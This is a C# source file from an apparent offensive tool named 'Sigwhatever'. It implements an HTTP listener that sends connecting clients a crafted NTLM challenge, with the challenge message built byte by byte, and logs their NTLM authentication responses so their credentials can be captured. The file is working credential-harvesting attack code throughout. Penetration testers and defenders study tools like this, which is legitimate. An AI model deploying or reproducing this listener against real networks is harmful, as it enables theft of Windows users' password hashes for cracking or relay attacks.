using System;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;
using System.Threading;

namespace Sigwhatever
{
    class HttpServer : IDisposable
    {
        private readonly int _maxThreads;
        private readonly HttpListener _listener;
        private readonly Thread _listenerThread;
        private readonly ManualResetEvent _stop, _idle;
        private readonly Semaphore _busy;
        private readonly string ntlmChallenge;
        private readonly string computerName;
        private readonly string dnsDomain;
        private readonly string netbiosDomain;
        private readonly string logfile;
        private readonly int port;
        private readonly string urlPrefix;

        public HttpServer(int maxThreads, string ntlmChallenge, 
            string computerName, string dnsDomain, string netbiosDomain, 
            string logfile, int port, string urlPrefix
            )
        {
            _maxThreads = maxThreads;
            _stop = new ManualResetEvent(false);
            _idle = new ManualResetEvent(false);
            _busy = new Semaphore(maxThreads, maxThreads);
            _listener = new HttpListener();
            _listenerThread = new Thread(HandleRequests);
            this.ntlmChallenge = ntlmChallenge;
            this.computerName = computerName;
            this.dnsDomain = dnsDomain;
            this.netbiosDomain = netbiosDomain;
            this.logfile = logfile;
            this.port = port;
            this.urlPrefix = urlPrefix;
        }

        public bool Start()
        {
            string prefix = String.Format("http://+:{0}/{1}/", port, this.urlPrefix.Trim('/'));
            try
            {
                _listener.Prefixes.Add(prefix);
                _listener.Start();
                _listenerThread.Start();
            }
            catch(HttpListenerException e)
            {
                Console.WriteLine($"[!] Error starting HTTP Listener: {e.Message}");
                return false;
            }

            Console.WriteLine(String.Format("[+] [{0}] Listening on: {1}", DateTime.Now.ToString("s"), prefix));
            return true;
        }

        public void Dispose()
        { Stop(); }

        public void Stop()
        {
            _stop.Set();
            if (_listenerThread.IsAlive)
            {
                _listenerThread.Join();
                _idle.Reset();
                _busy.WaitOne();

                if (_maxThreads != 1 + _busy.Release())
                    _idle.WaitOne();
                _listener.Stop();
            }
        }

        private void HandleRequests()
        {
            while (_listener.IsListening)
            {
                var context = _listener.BeginGetContext(ListenerCallback, null);

                if (0 == WaitHandle.WaitAny(new[] { _stop, context.AsyncWaitHandle }))
                    return;
            }
        }

        private void ListenerCallback(IAsyncResult ar)
        {
            _busy.WaitOne();
            try
            {
                HttpListenerContext context;
                try
                { context = _listener.EndGetContext(ar); }
                catch (HttpListenerException)
                { return; }

                if (_stop.WaitOne(0, false))
                    return;

                HttpListenerRequest request = context.Request;
                HttpListenerResponse response = context.Response;
                string httpType = "HTTP";
                string httpPort = port.ToString();
                string httpHeaderUserAgent = request.UserAgent;
                string httpMethod = request.HttpMethod;
                string httpHeaderHost = request.Headers.Get("Host");
                string httpRawURL = request.Url.ToString();
                string httpSourceIP = request.RemoteEndPoint.Address.ToString();
                string httpSourcePort = request.RemoteEndPoint.Port.ToString();

                Console.WriteLine(String.Format("[+] [{0}] {1}({2}) HTTP {3} request for {4} from {5}:{6}", DateTime.Now.ToString("s"), httpType, httpPort, httpMethod, httpRawURL, httpSourceIP, httpSourcePort));
                Console.WriteLine(String.Format("[+] [{0}] {1}({2}) HTTP host header {3} from {4}:{5}", DateTime.Now.ToString("s"), httpType, httpPort, httpHeaderHost, httpSourceIP, httpSourcePort));

                if (!String.IsNullOrEmpty(httpHeaderUserAgent))
                {
                    Console.WriteLine(String.Format("[+] [{0}] {1}({2}) HTTP user agent from {3}:{4}:{5}{6}", DateTime.Now.ToString("s"), httpType, httpPort, httpSourceIP, httpSourcePort, Environment.NewLine, httpHeaderUserAgent));
                }

                // Authorization
                bool ntlmESS = false;
                string httpHeaderAuthorization = request.Headers.Get("Authorization");
                int httpHeaderStatusCode = 401;
                string httpHeaderAuthenticate = "WWW-Authenticate";
                string authorizationNTLM = "NTLM";

                if (httpHeaderAuthorization != null && httpHeaderAuthorization.ToUpper().StartsWith("NTLM "))
                {
                    Console.WriteLine("[+] [{0}] {1}({2}) Got NTLM Authorization Header: {3}", DateTime.Now.ToString("s"), httpType, httpPort, httpHeaderAuthorization);
                    httpHeaderAuthorization = httpHeaderAuthorization.Substring(5, httpHeaderAuthorization.Length - 5);
                    byte[] httpAuthorization = Convert.FromBase64String(httpHeaderAuthorization);
                    if (httpAuthorization.Skip(8).Take(4).ToArray().SequenceEqual(new byte[] { 0x01, 0x00, 0x00, 0x00 }))
                    {
                        authorizationNTLM = GetNTLMChallengeBase64(ntlmESS, ntlmChallenge, httpSourceIP, httpSourcePort, Int32.Parse(httpPort), computerName, netbiosDomain, dnsDomain, httpType);
                    }
                    else if (httpAuthorization.Skip(8).Take(4).ToArray().SequenceEqual(new byte[] { 0x03, 0x00, 0x00, 0x00 }))
                    {
                        NTLM.GetNTLMResponse(httpAuthorization, httpSourceIP, httpSourcePort, httpType, httpPort, logfile);
                        httpHeaderStatusCode = 200;
                    }
                }

                if (!String.IsNullOrEmpty(httpHeaderAuthenticate) && authorizationNTLM != null && authorizationNTLM.Length > 0)
                {
                    response.AddHeader(httpHeaderAuthenticate, authorizationNTLM);
                }

                // response
                response.StatusCode = httpHeaderStatusCode;
                string responseString = "";
                byte[] buffer = Encoding.UTF8.GetBytes(responseString);
                response.ContentLength64 = buffer.Length;
                Stream output = response.OutputStream;
                output.Write(buffer, 0, buffer.Length);
                output.Close();
            }
            finally
            {
                if (_maxThreads == 1 + _busy.Release())
                    _idle.Set();
            }
        }

        public static string GetNTLMChallengeBase64(bool ntlmESS, string challenge, string ipAddress, string srcPort, int dstPort, string computerName, string netbiosDomain, string dnsDomain, string httpType)
        {
            byte[] httpTimestamp = BitConverter.GetBytes(DateTime.Now.ToFileTime());
            byte[] challengeArray = new byte[8];
            string session = ipAddress + ":" + srcPort;
            string httpChallenge = "";

            if (String.IsNullOrEmpty(challenge))
            {
                string challengeCharacters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                char[] challengeCharactersArray = new char[8];
                Random random = new Random();

                for (int i = 0; i < challengeCharactersArray.Length; i++)
                {
                    challengeCharactersArray[i] = challengeCharacters[random.Next(challengeCharacters.Length)];
                }

                string finalString = new String(challengeCharactersArray);
                challengeArray = Encoding.UTF8.GetBytes(finalString);
                httpChallenge = (BitConverter.ToString(challengeArray)).Replace("-", "");
            }
            else
            {
                httpChallenge = challenge;
                challenge = challenge.Insert(2, "-").Insert(5, "-").Insert(8, "-").Insert(11, "-").Insert(14, "-").Insert(17, "-").Insert(20, "-");
                int i = 0;

                foreach (string character in challenge.Split('-'))
                {
                    challengeArray[i] = Convert.ToByte(Convert.ToInt16(character, 16));
                    i++;
                }
            }
            lock (Program.outputList)
            {
                Console.WriteLine(String.Format("[+] [{0}] {1}({2}) NTLM challenge {3} sent to {4}", DateTime.Now.ToString("s"), httpType, dstPort, httpChallenge, session));
            }

            Program.httpSessionTable[session] = httpChallenge;
            byte[] httpNTLMNegotiationFlags = { 0x05, 0x82, 0x81, 0x0A };

            if (ntlmESS)
            {
                httpNTLMNegotiationFlags[2] = 0x89;
            }

            byte[] hostnameBytes = Encoding.Unicode.GetBytes(computerName);
            byte[] netbiosDomainBytes = Encoding.Unicode.GetBytes(netbiosDomain);
            byte[] dnsDomainBytes = Encoding.Unicode.GetBytes(dnsDomain);
            byte[] dnsHostnameBytes = Encoding.Unicode.GetBytes(computerName);
            byte[] hostnameLength = BitConverter.GetBytes(hostnameBytes.Length).Take(2).ToArray();
            byte[] netbiosDomainLength = BitConverter.GetBytes(netbiosDomainBytes.Length).Take(2).ToArray(); ;
            byte[] dnsDomainLength = BitConverter.GetBytes(dnsDomainBytes.Length).Take(2).ToArray(); ;
            byte[] dnsHostnameLength = BitConverter.GetBytes(dnsHostnameBytes.Length).Take(2).ToArray(); ;
            byte[] targetLength = BitConverter.GetBytes(hostnameBytes.Length + netbiosDomainBytes.Length + dnsDomainBytes.Length + dnsDomainBytes.Length + dnsHostnameBytes.Length + 36).Take(2).ToArray(); ;
            byte[] targetOffset = BitConverter.GetBytes(netbiosDomainBytes.Length + 56);

            MemoryStream ntlmMemoryStream = new MemoryStream();
            ntlmMemoryStream.Write((new byte[12] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x02, 0x00, 0x00, 0x00 }), 0, 12);
            ntlmMemoryStream.Write(netbiosDomainLength, 0, 2);
            ntlmMemoryStream.Write(netbiosDomainLength, 0, 2);
            ntlmMemoryStream.Write((new byte[4] { 0x38, 0x00, 0x00, 0x00 }), 0, 4);
            ntlmMemoryStream.Write(httpNTLMNegotiationFlags, 0, 4);
            ntlmMemoryStream.Write(challengeArray, 0, challengeArray.Length);
            ntlmMemoryStream.Write((new byte[8] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }), 0, 8);
            ntlmMemoryStream.Write(targetLength, 0, 2);
            ntlmMemoryStream.Write(targetLength, 0, 2);
            ntlmMemoryStream.Write(targetOffset, 0, 4);
            ntlmMemoryStream.Write((new byte[8] { 0x06, 0x01, 0xb1, 0x1d, 0x00, 0x00, 0x00, 0x0f }), 0, 8);
            ntlmMemoryStream.Write(netbiosDomainBytes, 0, netbiosDomainBytes.Length);
            ntlmMemoryStream.Write((new byte[2] { 0x02, 0x00 }), 0, 2);
            ntlmMemoryStream.Write(netbiosDomainLength, 0, 2);
            ntlmMemoryStream.Write(netbiosDomainBytes, 0, netbiosDomainBytes.Length);
            ntlmMemoryStream.Write((new byte[2] { 0x01, 0x00 }), 0, 2);
            ntlmMemoryStream.Write(hostnameLength, 0, 2);
            ntlmMemoryStream.Write(hostnameBytes, 0, hostnameBytes.Length);
            ntlmMemoryStream.Write((new byte[2] { 0x04, 0x00 }), 0, 2);
            ntlmMemoryStream.Write(dnsDomainLength, 0, 2);
            ntlmMemoryStream.Write(dnsDomainBytes, 0, dnsDomainBytes.Length);
            ntlmMemoryStream.Write((new byte[2] { 0x03, 0x00 }), 0, 2);
            ntlmMemoryStream.Write(dnsHostnameLength, 0, 2);
            ntlmMemoryStream.Write(dnsHostnameBytes, 0, dnsHostnameBytes.Length);
            ntlmMemoryStream.Write((new byte[2] { 0x05, 0x00 }), 0, 2);
            ntlmMemoryStream.Write(dnsDomainLength, 0, 2);
            ntlmMemoryStream.Write(dnsDomainBytes, 0, dnsDomainBytes.Length);
            ntlmMemoryStream.Write((new byte[4] { 0x07, 0x00, 0x08, 0x00 }), 0, 4);
            ntlmMemoryStream.Write(httpTimestamp, 0, httpTimestamp.Length);
            ntlmMemoryStream.Write((new byte[6] { 0x00, 0x00, 0x00, 0x00, 0x0a, 0x0a }), 0, 6);
            return "NTLM " + Convert.ToBase64String(ntlmMemoryStream.ToArray());
        }
    }
}